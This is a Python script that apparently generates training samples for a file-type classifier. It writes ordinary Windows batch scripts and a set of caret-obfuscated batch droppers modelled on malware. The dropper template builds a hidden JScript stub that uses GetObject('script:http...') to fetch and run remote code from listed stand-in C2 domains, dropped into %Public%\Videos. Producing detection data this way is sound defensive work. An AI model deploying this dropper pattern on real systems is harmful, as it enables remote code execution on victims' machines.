#!/usr/bin/env python3
"""Generate synthetic Batchfile + Batchfile+CaretObfuscated training samples.

- Batchfile: ~12 normal Windows batch scripts covering common idioms
  (@echo off, setlocal, env-var checks, for-loops, labels, gotos,
  conditional logic). The base bucket is empty today so the centroid
  needs to come from scratch.

- Batchfile+CaretObfuscated: ~10 obfuscated droppers mirroring the
  structural signature observed in the held-out corpus (caret-escapes,
  delayed expansion, sentinel-based substring substitution, JScript
  payload assembled via env vars and dropped to %Public%\Videos, piped
  back into cmd).
"""
import os
import random
import string

ROOT = "/Users/dazhi/projects/filetyping/whatis/samples"


def rand_upper(n):
    return "".join(random.choices(string.ascii_uppercase, k=n))


def rand_mixed(n):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


def rand_var():
    return rand_upper(random.randint(3, 6))


# ---------- Batchfile (normal) ----------

NORMAL_TEMPLATES = [
    # 1. Build-script style
    lambda: f"""@echo off
setlocal enabledelayedexpansion
set BUILD_DIR=%~dp0build
set CONFIG={random.choice(['Release', 'Debug'])}
if not exist "%BUILD_DIR%" mkdir "%BUILD_DIR%"
pushd "%BUILD_DIR%"
echo Building configuration %CONFIG% ...
cmake .. -DCMAKE_BUILD_TYPE=%CONFIG%
if errorlevel 1 (
    echo CMake configure failed
    popd
    endlocal
    exit /b 1
)
cmake --build . --config %CONFIG% -- /m
if errorlevel 1 (
    echo Build failed
    popd
    endlocal
    exit /b 1
)
echo Build succeeded.
popd
endlocal
exit /b 0
""",
    # 2. Backup utility
    lambda: f"""@echo off
setlocal
rem Backup script — copies sources/* to backups/<date>
set SRC=%~dp0sources
set DST=%~dp0backups\\%date:~6,4%%date:~3,2%%date:~0,2%
if not exist "%DST%" mkdir "%DST%"
for /r "%SRC%" %%f in (*.txt *.csv *.log) do (
    echo Copying %%~nxf
    copy /Y "%%f" "%DST%\\" >nul
)
echo Backup complete: %DST%
endlocal
""",
    # 3. Service wrapper
    lambda: f"""@echo off
:start
sc query "{rand_upper(8)}" | findstr /i "RUNNING" >nul
if errorlevel 1 (
    echo Service not running, starting...
    net start "{rand_upper(8)}"
    if errorlevel 1 (
        echo Failed to start service.
        timeout /t 30 >nul
        goto start
    )
)
echo Service is up.
exit /b 0
""",
    # 4. Path manipulation
    lambda: f"""@echo off
rem Add a directory to PATH if it isn't already there
set NEW=%~1
if "%NEW%"=="" (
    echo Usage: %~nx0 ^<directory^>
    exit /b 1
)
echo %PATH% | findstr /i /c:"%NEW%" >nul
if not errorlevel 1 (
    echo Already on PATH.
    exit /b 0
)
setx PATH "%PATH%;%NEW%"
echo Added %NEW% to PATH.
""",
    # 5. Loop over files with delayed expansion
    lambda: f"""@echo off
setlocal enabledelayedexpansion
set COUNT=0
set TOTAL=0
for %%f in (*.log) do (
    set /a COUNT+=1
    for %%a in ("%%f") do set /a TOTAL+=%%~za
)
echo Found !COUNT! files, total size !TOTAL! bytes.
endlocal
""",
    # 6. Network test
    lambda: f"""@echo off
setlocal
set HOSTS={random.choice(['google.com', 'github.com', 'cloudflare.com'])} 8.8.8.8 1.1.1.1
for %%h in (%HOSTS%) do (
    ping -n 1 -w 2000 %%h >nul
    if errorlevel 1 (echo %%h DOWN) else (echo %%h UP)
)
endlocal
""",
    # 7. Choice prompt
    lambda: f"""@echo off
:menu
cls
echo {rand_upper(6)} configuration menu
echo 1. Install
echo 2. Uninstall
echo 3. Repair
echo 4. Quit
choice /c 1234 /n /m "Select: "
if errorlevel 4 goto end
if errorlevel 3 goto repair
if errorlevel 2 goto uninstall
if errorlevel 1 goto install
:install
call :do_install
goto menu
:uninstall
call :do_uninstall
goto menu
:repair
call :do_repair
goto menu
:do_install
echo Installing...
exit /b
:do_uninstall
echo Uninstalling...
exit /b
:do_repair
echo Repairing...
exit /b
:end
""",
    # 8. Token splitting
    lambda: f"""@echo off
rem Parse a colon-delimited config file
for /f "tokens=1,2 delims=:" %%k in (config.txt) do (
    if /i "%%k"=="server" set SERVER=%%l
    if /i "%%k"=="port" set PORT=%%l
    if /i "%%k"=="user" set USER=%%l
)
echo Server=%SERVER% Port=%PORT% User=%USER%
""",
    # 9. errorlevel chain
    lambda: f"""@echo off
where /q git || (echo git not on PATH & exit /b 1)
git rev-parse --is-inside-work-tree >nul 2>&1 || (echo not a git repo & exit /b 1)
for /f "delims=" %%b in ('git rev-parse --abbrev-ref HEAD') do set BRANCH=%%b
echo Current branch: %BRANCH%
""",
    # 10. Self-elevation
    lambda: f"""@echo off
net session >nul 2>&1
if not %errorLevel% == 0 (
    echo Requesting admin privileges...
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)
echo Running as administrator.
sc config "{rand_upper(8)}" start= auto
""",
    # 11. ENVI substitute
    lambda: f"""@echo off
setlocal
set TMPLOG=%TEMP%\\install-%RANDOM%.log
echo Logging to %TMPLOG%
(
    echo Installer started at %date% %time%
    echo User: %USERNAME%
    echo Host: %COMPUTERNAME%
) > "%TMPLOG%"
type "%TMPLOG%"
endlocal
""",
    # 12. Recursive cleanup
    lambda: f"""@echo off
rem Delete all .tmp and .bak files under cwd, with confirmation
choice /c YN /n /m "Delete all .tmp and .bak files? (Y/N): "
if errorlevel 2 (
    echo Aborted.
    exit /b 0
)
for /r %%f in (*.tmp *.bak) do (
    echo Deleting %%f
    del /q "%%f"
)
echo Done.
""",
    # 13. Mixed-case keywords (real batch is case-insensitive)
    lambda: f"""@ECHO OFF
SETLOCAL ENABLEEXTENSIONS
SET SVC_NAME={rand_upper(6)}
SET LOG_DIR=%ProgramData%\\%SVC_NAME%\\Logs
IF NOT EXIST "%LOG_DIR%" MKDIR "%LOG_DIR%"
FOR %%i IN (1 2 3 4 5) DO (
    ECHO Tick %%i at %time% >> "%LOG_DIR%\\tick.log"
    TIMEOUT /T 1 >NUL
)
ENDLOCAL
""",
]


def gen_normal(seed):
    random.seed(seed)
    tpl = random.choice(NORMAL_TEMPLATES)
    return tpl()


# ---------- Batchfile+CaretObfuscated ----------

C2_DOMAINS = [
    "abcd1234.example.com",
    "zxqyu7.gamingcompany.io",
    "p3qmrz.helpdeskcorp.net",
    "1mxntr.cdnedge.work",
    "qqzltu.fastcontent.us",
    "k5vbno.mediatech.online",
    "wfgkvz.serverstatus.co",
    "yyzulm.cloudops.host",
    "trqq2x.streamhub.sbs",
    "p9zzqx.routerlink.org",
]


def _carrot_split(token):
    """Inject one or two random caret-escapes into a Batch keyword."""
    if len(token) < 3:
        return token
    n_inserts = random.randint(1, 2)
    out = list(token)
    used = set()
    for _ in range(n_inserts):
        pos = random.randint(1, len(out) - 1)
        if pos in used:
            continue
        used.add(pos)
        out.insert(pos, "^")
    return "".join(out)


def _rand_junk(n):
    return rand_mixed(n)


def gen_caret_obfuscated(seed):
    random.seed(seed)
    var1 = rand_var()
    var2 = rand_var()
    var3 = rand_var()
    var4 = rand_var()
    var5 = rand_var()
    junk1 = _rand_junk(random.randint(3, 6))
    sep = _rand_junk(random.randint(4, 6))
    domain = random.choice(C2_DOMAINS)
    cyrillic = "ежзий╗"  # ежзий╗ marker observed in originals
    file_stub = _rand_junk(random.randint(6, 8))

    set_kw_a = _carrot_split("seT")
    set_kw_b = _carrot_split("seT")
    set_kw_c = _carrot_split("Set")
    set_kw_d = _carrot_split("seT")
    set_kw_e = _carrot_split("seT")

    return (
        f"start /MIN %ComSpec% /V/D/c "
        f"\"{set_kw_a} {var1}=^{cyrillic[0]}{cyrillic[1]}^{cyrillic[2]}{cyrillic[3]}^{cyrillic[4]}{cyrillic[5]}"
        f"&&{set_kw_b} {var2}=%Public%\\V^id^eos\\^{file_stub}"
        f"&&{set_kw_c} {var3}=tr^y^{{^v{junk1}ar c='sc^ri^pt^:';d='h{junk1}Tt^P:';"
        f"G{junk1}et^Ob^j{junk1}ec^t(c+d+'&&{set_kw_d} {var4}={sep}{sep}{domain}{sep}?1{sep}');}}"
        f"c^a^tch^(e^){{^}}^;"
        f"&&{set_kw_e}/^p {var5}=\"!{var3}:{junk1}=!!{var4}:{sep}=/!\""
        f"<n^ul > !{var2}!.^j^S"
        f"|ca^l^l s^t^a^rt !{var2}!.j^S \""
        f"|c^M^d\n"
    )


def main():
    # Normal Batchfile
    target_n = os.path.join(ROOT, "Batchfile")
    for i in range(13):
        path = os.path.join(target_n, f"batch_normal_{i}.bat")
        with open(path, "w", encoding="utf-8", newline="\r\n") as f:
            f.write(gen_normal(seed=5000 + i))
        print(f"wrote {path} ({os.path.getsize(path)} bytes)")
    # Obfuscated
    target_o = os.path.join(ROOT, "Batchfile+CaretObfuscated")
    for i in range(10):
        path = os.path.join(target_o, f"batch_caret_{i}.bat")
        with open(path, "w", encoding="utf-8") as f:
            f.write(gen_caret_obfuscated(seed=6000 + i))
        print(f"wrote {path} ({os.path.getsize(path)} bytes)")


if __name__ == "__main__":
    main()
